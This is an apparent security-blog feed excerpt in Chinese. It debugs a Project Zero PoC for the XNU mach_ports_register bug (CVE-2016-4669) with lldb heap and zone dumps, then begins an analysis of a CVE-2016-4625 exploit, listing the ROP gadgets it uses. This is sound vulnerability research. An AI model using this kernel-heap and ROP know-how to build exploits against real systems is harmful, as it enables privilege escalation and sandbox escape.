<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) bt&#10;* thread #1: tid = 0x0001, 0xffffff8009686568 kernel.development`mach_ports_register(task=0xffffff8012933640, memory=0xffffff800f7da660, portsCnt=3) + 40 at ipc_tt.c:1060, stop reason = breakpoint 1.1&#10;  * frame #0: 0xffffff8009686568 kernel.development`mach_ports_register(task=0xffffff8012933640, memory=0xffffff800f7da660, portsCnt=3) + 40 at ipc_tt.c:1060 [opt]&#10;    frame #1: 0xffffff80096e43ff kernel.development`_Xmach_ports_register(InHeadP=0xffffff8013c7937c, OutHeadP=0xffffff8014efaf90) + 111 at task_server.c:647 [opt]&#10;    frame #2: 0xffffff8009683443 kernel.development`ipc_kobject_server(request=0xffffff8013c79300) + 259 at ipc_kobject.c:340 [opt]&#10;    frame #3: 0xffffff800965ef03 kernel.development`ipc_kmsg_send(kmsg=&#60;unavailable&#62;, option=&#60;unavailable&#62;, send_timeout=0) + 211 at ipc_kmsg.c:1443 [opt]&#10;    frame #4: 0xffffff8009675985 kernel.development`mach_msg_overwrite_trap(args=&#60;unavailable&#62;) + 197 at mach_msg.c:474 [opt]&#10;    frame #5: 0xffffff800977f000 kernel.development`mach_call_munger64(state=0xffffff801278eb60) + 480 at bsd_i386.c:560 [opt]&#10;    frame #6: 0xffffff80097b4de6 kernel.development`hndl_mach_scall64 + 22</span><br></pre></td></tr></table></figure>
<h3 id="2-2-2_memory的zone分析">2.2.2 memory的zone分析</h3><p>通过<code>lldb</code>调试器查看<code>memory</code>处的内存，如下。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 memory&#10;0xffffff800f7da660: 0xffffff80140e7580 0xdeadbeefdeadbeef&#10;0xffffff800f7da670: 0xffffff800f7dab00 0xfacadea23d1ec085&#10;0xffffff800f7da680: 0x0000000000000000 0xffffffff00000000&#10;0xffffff800f7da690: 0x0000000000000000 0x0000000000001000</span><br></pre></td></tr></table></figure>
<p>通过一点小技巧可以查看<code>memory</code>是在哪一个<code>zone</code>上分配的，也可以继续跟踪代码，在后面的<code>kfree</code>中调用<code>zfree</code>函数的流程中会出现相关的转换代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (zone-&gt;use_page_list) &#123;</span><br><span class="line">		<span class="keyword">struct</span> zone_page_metadata *page_meta = get_zone_page_metadata((<span class="keyword">struct</span> zone_free_element *)addr);</span><br><span class="line">		<span class="keyword">if</span> (zone != page_meta-&gt;zone) &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>其实就是<code>get_zone_page_metadata</code>这个函数的实现了，这里的<code>addr</code>就是<code>memory</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *(zone_page_metadata*)0xffffff80140e7000&#10;(zone_page_metadata) $1 = &#123;&#10;  pages = &#123;&#10;    next = 0xffffff8012db4000&#10;    prev = 0xffffff801109f000&#10;  &#125;&#10;  elements = 0xffffff80140e76d0&#10;  zone = 0xffffff800f480ba0&#10;  alloc_count = 12&#10;  free_count = 1&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>在查看<code>zone</code>的具体数据，可以得知<code>memory</code>被分配在哪个<code>zone</code>当中。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#10;zone_name = 0xffffff8009d35bac &#34;kalloc.16&#34;&#10;...</span><br></pre></td></tr></table></figure>
<p>可以得知，因为<code>port</code>的个数被设置为1个，所以只需要一个指针，而在调用<code>kfree</code>的时候，<code>kfree</code>的<code>size</code>是3个指针的长度，所以是试图在<code>kalloc.24</code>中释放内存,这就会造成错误的<code>kfree</code>，但是苹果有一段神奇的代码，尝试修复这个问题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (zone-&gt;use_page_list) &#123;</span><br><span class="line">		<span class="keyword">struct</span> zone_page_metadata *page_meta = get_zone_page_metadata((<span class="keyword">struct</span> zone_free_element *)addr);</span><br><span class="line">		<span class="keyword">if</span> (zone != page_meta-&gt;zone) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Something bad has happened. Someone tried to zfree a pointer but the metadata says it is from</span><br><span class="line">			 * a different zone (or maybe it's from a zone that doesn't use page free lists at all). We can repair</span><br><span class="line">			 * some cases of this, if:</span><br><span class="line">			 * 1) The specified zone had use_page_list, and the true zone also has use_page_list set. In that case</span><br><span class="line">			 *    we can swap the zone_t</span><br><span class="line">			 * 2) The specified zone had use_page_list, but the true zone does not. In this case page_meta is garbage,</span><br><span class="line">			 *    and dereferencing page_meta-&gt;zone might panic.</span><br><span class="line">			 * To distinguish the two, we enumerate the zone list to match it up.</span><br><span class="line">			 * We do not handle the case where an incorrect zone is passed that does not have use_page_list set,</span><br><span class="line">			 * even if the true zone did have this set.</span><br><span class="line">			 */</span></span><br><span class="line">			<span class="keyword">zone_t</span> fixed_zone = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">int</span> fixed_i, max_zones;</span><br><span class="line"></span><br><span class="line">			simple_lock(&amp;all_zones_lock);</span><br><span class="line">			max_zones = num_zones;</span><br><span class="line">			fixed_zone = first_zone;</span><br><span class="line">			simple_unlock(&amp;all_zones_lock);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (fixed_i=<span class="number">0</span>; fixed_i &lt; max_zones; fixed_i++, fixed_zone = fixed_zone-&gt;next_zone) &#123;</span><br><span class="line">				<span class="keyword">if</span> (fixed_zone == page_meta-&gt;zone &amp;&amp; fixed_zone-&gt;use_page_list) &#123;</span><br><span class="line">					<span class="comment">/* we can fix this */</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"Fixing incorrect zfree from zone %s to zone %s\n"</span>, zone-&gt;zone_name, fixed_zone-&gt;zone_name);</span><br><span class="line">					zone = fixed_zone;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>用代码修复数据结构的错误本身就是一件很危险的事情，而这里更危险的是如果不能修复这个错误的话，代码没有任何报错或提示，这里就会有很多隐患。</p>
<h2 id="2-2-3_堆内存简单分析">2.2.3 堆内存简单分析</h2><p>这里简单的分析一下内核中堆的数据结构，写到这里的时候我重启了一次虚拟机和调试器，所以地址和之前会对不上。</p>
<p>这一次看到的<code>kalloc.16</code>的<code>zone</code>如下。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *(zone*)0xffffff80213caea0&#10;(zone) $5 = &#123;&#10;  free_elements = 0x0000000000000000&#10;  pages = &#123;&#10;    any_free_foreign = &#123;&#10;      next = 0xffffff80213caea8&#10;      prev = 0xffffff80213caea8&#10;    &#125;&#10;    all_free = &#123;&#10;      next = 0xffffff80213caeb8&#10;      prev = 0xffffff80213caeb8&#10;    &#125;&#10;    intermediate = &#123;&#10;      next = 0xffffff8025e06000&#10;      prev = 0xffffff8025706000&#10;    &#125;&#10;    all_used = &#123;&#10;      next = 0xffffff8025226000&#10;      prev = 0xffffff8025d29000&#10;    &#125;&#10;  &#125;&#10;  count = 29951&#10;  countfree = 37&#10;  lock_attr = (lck_attr_val = 0)&#10;  lock = &#123;&#10;    lck_mtx_sw = &#123;&#10;      lck_mtxd = &#123;&#10;        lck_mtxd_owner = 0&#10;         = &#123;&#10;           = &#123;&#10;            lck_mtxd_waiters = 0&#10;            lck_mtxd_pri = 0&#10;            lck_mtxd_ilocked = 0&#10;            lck_mtxd_mlocked = 0&#10;            lck_mtxd_promoted = 0&#10;            lck_mtxd_spin = 0&#10;            lck_mtxd_is_ext = 0&#10;            lck_mtxd_pad3 = 0&#10;          &#125;&#10;          lck_mtxd_state = 0&#10;        &#125;&#10;        lck_mtxd_pad32 = 4294967295&#10;      &#125;&#10;      lck_mtxi = &#123;&#10;        lck_mtxi_ptr = 0x0000000000000000&#10;        lck_mtxi_tag = 0&#10;        lck_mtxi_pad32 = 4294967295&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;  lock_ext = &#123;&#10;    lck_mtx = &#123;&#10;      lck_mtx_sw = &#123;&#10;        lck_mtxd = &#123;&#10;          lck_mtxd_owner = 0&#10;           = &#123;&#10;             = &#123;&#10;              lck_mtxd_waiters = 0&#10;              lck_mtxd_pri = 0&#10;              lck_mtxd_ilocked = 0&#10;              lck_mtxd_mlocked = 0&#10;              lck_mtxd_promoted = 0&#10;              lck_mtxd_spin = 0&#10;              lck_mtxd_is_ext = 0&#10;              lck_mtxd_pad3 = 0&#10;            &#125;&#10;            lck_mtxd_state = 0&#10;          &#125;&#10;          lck_mtxd_pad32 = 0&#10;        &#125;&#10;        lck_mtxi = &#123;&#10;          lck_mtxi_ptr = 0x0000000000000000&#10;          lck_mtxi_tag = 0&#10;          lck_mtxi_pad32 = 0&#10;        &#125;&#10;      &#125;&#10;    &#125;&#10;    lck_mtx_grp = 0x0000000000000000&#10;    lck_mtx_attr = 0&#10;    lck_mtx_pad1 = 0&#10;    lck_mtx_deb = (type = 0, pad4 = 0, pc = 0, thread = 0)&#10;    lck_mtx_stat = 0&#10;    lck_mtx_pad2 = ([0] = 0, [1] = 0)&#10;  &#125;&#10;  cur_size = 479808&#10;  max_size = 531441&#10;  elem_size = 16&#10;  alloc_size = 4096&#10;  page_count = 119&#10;  sum_count = 235587&#10;  exhaustible = 0&#10;  collectable = 1&#10;  expandable = 1&#10;  allows_foreign = 0&#10;  doing_alloc_without_vm_priv = 0&#10;  doing_alloc_with_vm_priv = 0&#10;  waiting = 0&#10;  async_pending = 0&#10;  zleak_on = 0&#10;  caller_acct = 0&#10;  doing_gc = 0&#10;  noencrypt = 0&#10;  no_callout = 0&#10;  async_prio_refill = 0&#10;  gzalloc_exempt = 0&#10;  alignment_required = 0&#10;  use_page_list = 1&#10;  _reserved = 0&#10;  index = 12&#10;  next_zone = 0xffffff80213ca120&#10;  zone_name = 0xffffff801ef3af0d &#34;kalloc.16&#34;&#10;  zleak_capture = 0&#10;  zp_count = 0&#10;  prio_refill_watermark = 0&#10;  zone_replenish_thread = 0x0000000000000000&#10;  gz = &#123;&#10;    gzfc_index = 0&#10;    gzfc = 0xdeadbeefdeadbeef&#10;  &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>这里就主要的分析一下<code>page</code>和<code>page</code>内的内存的分布。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *(zone*)0xffffff80213caea0&#10;(zone) $5 = &#123;&#10;  free_elements = 0x0000000000000000&#10;  pages = &#123;&#10;    any_free_foreign = &#123;&#10;      next = 0xffffff80213caea8&#10;      prev = 0xffffff80213caea8&#10;    &#125;&#10;    all_free = &#123;&#10;      next = 0xffffff80213caeb8&#10;      prev = 0xffffff80213caeb8&#10;    &#125;&#10;    intermediate = &#123;&#10;      next = 0xffffff8025e06000&#10;      prev = 0xffffff8025706000&#10;    &#125;&#10;    all_used = &#123;&#10;      next = 0xffffff8025226000&#10;      prev = 0xffffff8025d29000&#10;    &#125;&#10;  &#125;&#10;  ...</span><br></pre></td></tr></table></figure>
<p>简单的看一下4个<code>pages</code>的队列中的<code>intermediate</code>，在这个队列中的<code>page</code>里都会有一些未被使用的内存,通过<code>pages</code>里面的<code>next</code>和<code>prev</code>构成了一个双向链表，如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *(zone_page_metadata*)<span class="number">0xffffff8025e06000</span></span><br><span class="line">(zone_page_metadata) $<span class="number">6</span> = &#123;</span><br><span class="line">  pages = &#123;</span><br><span class="line">    next = <span class="number">0xffffff8025548000</span></span><br><span class="line">    prev = <span class="number">0xffffff80213caec8</span></span><br><span class="line">  &#125;</span><br><span class="line">  elements = <span class="number">0xffffff8025e06750</span></span><br><span class="line">  zone = <span class="number">0xffffff80213caea0</span></span><br><span class="line">  alloc_count = <span class="number">252</span></span><br><span class="line">  free_count = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(lldb) p *(zone_page_metadata*)<span class="number">0xffffff8025548000</span></span><br><span class="line">(zone_page_metadata) $<span class="number">12</span> = &#123;</span><br><span class="line">  pages = &#123;</span><br><span class="line">    next = <span class="number">0xffffff8025c96000</span></span><br><span class="line">    prev = <span class="number">0xffffff8025e06000</span></span><br><span class="line">  &#125;</span><br><span class="line">  elements = <span class="number">0xffffff8025548d50</span></span><br><span class="line">  zone = <span class="number">0xffffff80213caea0</span></span><br><span class="line">  alloc_count = <span class="number">252</span></span><br><span class="line">  free_count = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(lldb) p *(zone_page_metadata*)<span class="number">0xffffff8025c96000</span></span><br><span class="line">(zone_page_metadata) $<span class="number">13</span> = &#123;</span><br><span class="line">  pages = &#123;</span><br><span class="line">    next = <span class="number">0xffffff8025cb3000</span></span><br><span class="line">    prev = <span class="number">0xffffff8025548000</span></span><br><span class="line">  &#125;</span><br><span class="line">  elements = <span class="number">0xffffff8025c968e0</span></span><br><span class="line">  zone = <span class="number">0xffffff80213caea0</span></span><br><span class="line">  alloc_count = <span class="number">252</span></span><br><span class="line">  free_count = <span class="number">5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>elements</code>就是第一个可以<code>alloc</code>的内存，通过lldb观察内存布局</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 0xffffff8025c968e0&#10;0xffffff8025c968e0: 0xffffff8025c96670 0xfacade04d7b687dd&#10;&#10;(lldb) memory read --format x --size 8 0xffffff8025c96670&#10;0xffffff8025c96670: 0xffffff8025c96680 0xfacade04d7b6872d&#10;&#10;(lldb) memory read --format x --size 8 0xffffff8025c96680&#10;0xffffff8025c96680: 0xffffff8025c96a40 0xfacade04d7b68bed&#10;&#10;(lldb) memory read --format x --size 8 0xffffff8025c96680&#10;0xffffff8025c96680: 0xffffff8025c96a40 0xfacade04d7b68bed</span><br></pre></td></tr></table></figure>
<p><code>freeelement</code>是通过单向链表随机的串联在<code>page</code>中，在前面<a href="http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf" target="_blank" rel="external">iOS 10 Kernel Heap Revisited</a>中提到的。</p>
<p>可以看到前面的8个字节控制链表的，后面8个字节是<code>freeelement</code>的存储空间，<code>0xfacade</code>就是堆中的cookies。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zp_poisoned_cookie &amp;= <span class="number">0x000000FFFFFFFFFF</span>;</span><br><span class="line">zp_poisoned_cookie |= <span class="number">0x0535210000000000</span>; <span class="comment">/* 0xFACADE */</span></span><br></pre></td></tr></table></figure>
<p>了解了<code>freeelement</code>的内存布局，再看一看已经被分配了的内存，也就是<code>memory</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size <span class="number">8</span> memory</span><br><span class="line"><span class="number">0xffffff8025e06300</span>: <span class="number">0xffffff8029828430</span> <span class="number">0xdeadbeefdeadbeef</span></span><br></pre></td></tr></table></figure>
<p>阅读源码中的<code>zalloc_internal</code>函数的实现，可以得知，在kalloc.16的堆中分配申请内存时，会将申请出来的内存会被写入<code>0xdeadbeefdeadbeef</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vm_offset_t</span> *primary  = (<span class="keyword">vm_offset_t</span> *) addr; <span class="comment">//addr == memory</span></span><br><span class="line"><span class="keyword">vm_offset_t</span> *backup   = get_backup_ptr(inner_size, primary);</span><br><span class="line"></span><br><span class="line">*primary = ZP_POISON;</span><br><span class="line">*backup  = ZP_POISON;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-4_ipc_port_release_send">2.2.4 ipc_port_release_send</h3><p>在导致崩溃的函数处下断点</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b ipc_tt.c :1097</span><br><span class="line">Breakpoint 2: where = kernel.development`mach_ports_register + 521 at ipc_tt.c:1097, address = 0xffffff801e886749</span><br><span class="line">(lldb) c</span><br><span class="line">Process 1 resuming</span><br><span class="line"></span><br><span class="line">Process 1 stopped</span><br><span class="line">* thread #2: tid = 0x0002, 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff8025e06300, portsCnt=3) + 521 at ipc_tt.c:1097, stop reason = breakpoint 2.1</span><br><span class="line">    frame #0: 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff8025e06300, portsCnt=3) + 521 at ipc_tt.c:1097 [opt]</span><br><span class="line">      </span><br><span class="line">(lldb) p ports</span><br><span class="line">(ipc_port_t [3]) $15 = &#123;</span><br><span class="line">  [0] = 0xffffff80279d8190</span><br><span class="line">  [1] = 0x0000000000000000</span><br><span class="line">  [2] = 0x0000000000000000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>ports</code>的值只有ports[0]有值，这是因为这里的<code>ports</code>是从旧的<code>port</code>中替换来的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> *	Replace the old send rights with the new.</span><br><span class="line"> *	Release the old rights after unlocking.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TASK_PORT_REGISTER_MAX; i++) &#123;</span><br><span class="line">	<span class="keyword">ipc_port_t</span> old;</span><br><span class="line"></span><br><span class="line">	old = task-&gt;itk_registered[i];</span><br><span class="line">	task-&gt;itk_registered[i] = ports[i];</span><br><span class="line">	ports[i] = old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>据悉执行后，<code>r3gister</code>会再次被断住，第二次调用<code>mach_ports_register</code>后，内核断点，再看<code>ports</code>，如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* thread #2: tid = 0x0002, 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff80253d3e70, portsCnt=3) + 521 at ipc_tt.c:1097, stop reason = breakpoint 2.1</span><br><span class="line">    frame #0: 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff80253d3e70, portsCnt=3) + 521 at ipc_tt.c:1097 [opt]</span><br><span class="line">(lldb) p ports</span><br><span class="line">(ipc_port_t [3]) $16 = &#123;</span><br><span class="line">  [0] = 0xffffff8029828430</span><br><span class="line">  [1] = 0xdeadbeefdeadbeef</span><br><span class="line">  [2] = 0xffffff80252f1460</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而导致在服务器的后续代码中触发了崩溃</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; TASK_PORT_REGISTER_MAX; i++)</span><br><span class="line">	if (IP_VALID(ports[i]))</span><br><span class="line">		ipc_port_release_send(ports[i]);//&lt;--第二个ports就是0xdeadbeefdeadbeef</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> *	Now that the operation is known to be successful,</span><br><span class="line"> *	we can free the memory.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">if (portsCnt != 0)</span><br><span class="line">	kfree(memory,</span><br><span class="line">	      (vm_size_t) (portsCnt * sizeof(mach_port_t)));</span><br></pre></td></tr></table></figure>
<h1 id="0x03_小结">0x03 小结</h1><p>这里只分析了<code>POC</code>的触发，如果修改<code>mach_ports_register</code>的参数，将<code>port</code>的个数改为2个，port[1]就会变成<code>0x0000000000000000</code>，从而避免了对<code>0xdeadbeefdeadbeef</code>调用函数出发崩溃，而且zone会变成iports的一个专用的<code>zone</code>，而不是<code>kalloc.16</code>,所以这个漏洞值得研究的地方还有很多。希望本文能为大家继续研究这个漏洞提供一些帮助；-）。</p>
<h1 id="参考">参考</h1><p>1、<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=882&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X/iOS multiple memory safety issues in mach_ports_register</a></p>
<p>2、<a href="http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf" target="_blank" rel="external">iOS 10 Kernel Heap Revisited</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>本文记录了对<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-4669">CVE-2016-4669</a>的<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=244431">POC</a>的调试中遇到的问题，以及相关知识的整理，该漏洞的原始报告在<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=882&amp;can=1&amp;q=apple&amp;sort=-id">这里</a>。原始报告中的内容，本文不在复述。</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[XNU内核中task_t相关漏洞分析笔记(Part I)]]></title>
    <link href="http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/"/>
    <id>http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/</id>
    <published>2016-10-28T20:09:25.000Z</published>
    <updated>2016-10-29T02:52:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    前两天<a href="https://googleprojectzero.blogspot.com/" target="_blank" rel="external">Project Zero</a>的blog上面，Ian Beer发表了一篇新的文章，讨论了在<code>xnu</code> 的内核在设计上存在的一个问题，从而可以导致提权，沙箱逃逸等一洗了的问题。并且提供了相应的的POC与EXP源码。这篇文章是调试与分析其中第一个漏洞<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4625" target="_blank" rel="external">CVE-2016-4625</a>的部分。</p>
<p><a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a></p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=831&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X/iOS kernel use-after-free in IOSurface</a></p>
<a id="more"></a>
<h1 id="0x01_准备工作">0x01 准备工作</h1><h2 id="1-1_基础知识">1.1 基础知识</h2><p>​    在阅读本文之前，需要稍微了解一下<code>mach_msg</code>相关的知识，以及一些使用<code>mach_msg</code>的技巧，理解父进程与子进程交换<code>port</code>之后可以做一些操作。</p>
<ul>
<li><a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">再看CVE-2016-1757—浅析mach message的使用</a></li>
<li><a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html" target="_blank" rel="external">Changes to XNU Mach IPC</a></li>
</ul>
<h2 id="1-2_调试环境">1.2 调试环境</h2><p>​    本文的<code>EXP</code>的运行环境是<code>OS X 10.11.6</code>。使用的虚拟机软件是parallels desktop</p>
<h2 id="0x02_漏洞成因">0x02 漏洞成因</h2><p>​    <a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a>这篇已经说的很清楚了。这幅图大致反应出整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/task_t_analysis/EXP_flow.png" alt="exploit执行流程"></p>
<h1 id="0x03_Exploit调试">0x03 Exploit调试</h1><p>对理解整个<code>exploit</code>关键的几个点进行调试。</p>
<h2 id="3-1_setup_payload_and_offsets">3.1 setup_payload_and_offsets</h2><p>首先通过<code>memmem</code>函数在<code>libsystem_c.dylib</code>中找到几个相应的<code>ROP</code>组件。</p>
<ul>
<li>ret指令所在地址<code>0x7fff8fe520d5</code>。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s    ret&#10;libsystem_c.dylib`strcpy:&#10;    0x7fff8fe520d5 &#60;+85&#62;:  ret&#10;    0x7fff8fe520d6 &#60;+86&#62;:  movdqu xmm0, xmmword ptr [rsi + rcx]&#10;    0x7fff8fe520db &#60;+91&#62;:  movdqu xmmword ptr [rdi], xmm0</span><br></pre></td></tr></table></figure>
<ul>
<li>pop_rdi_ret指令所在地址<code>0x7fff8fe8a213</code>。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s pop_rdi_ret&#10;libsystem_c.dylib`addr2ascii:&#10;    0x7fff8fe8a213 &#60;+116&#62;: pop    rdi&#10;    0x7fff8fe8a214 &#60;+117&#62;: ret&#10;    0x7fff8fe8a215 &#60;+118&#62;: add    al, 0x0</span><br></pre></td></tr></table></figure>
<ul>
<li>stack_shift_gadget指令所在地址<code>0x7fff8fed1cec</code></li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s stack_shift_gadget&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;    0x7fff8fed1cec &#60;+1935&#62;: add    rsp, 0x1d88&#10;    0x7fff8fed1cf3 &#60;+1942&#62;: pop    rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret</span><br></pre></td></tr></table></figure>
